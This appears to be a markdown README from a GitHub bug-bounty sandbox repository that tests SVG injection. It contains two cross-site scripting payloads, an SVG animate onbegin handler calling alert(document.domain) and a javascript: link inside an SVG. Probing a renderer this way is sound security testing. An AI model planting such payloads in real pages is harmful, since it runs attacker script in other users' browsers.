# GitHub BBP Sandbox

Testing SVG Injection:

<svg>
  <animate onbegin="alert(document.domain)" attributeName="x" from="0" to="10" dur="1s" />
  <rect width="100" height="100" fill="red" />
</svg>

<details open>
  <summary>Click for XSS</summary>
  <svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100" fill="blue"/></a></svg>
</details>
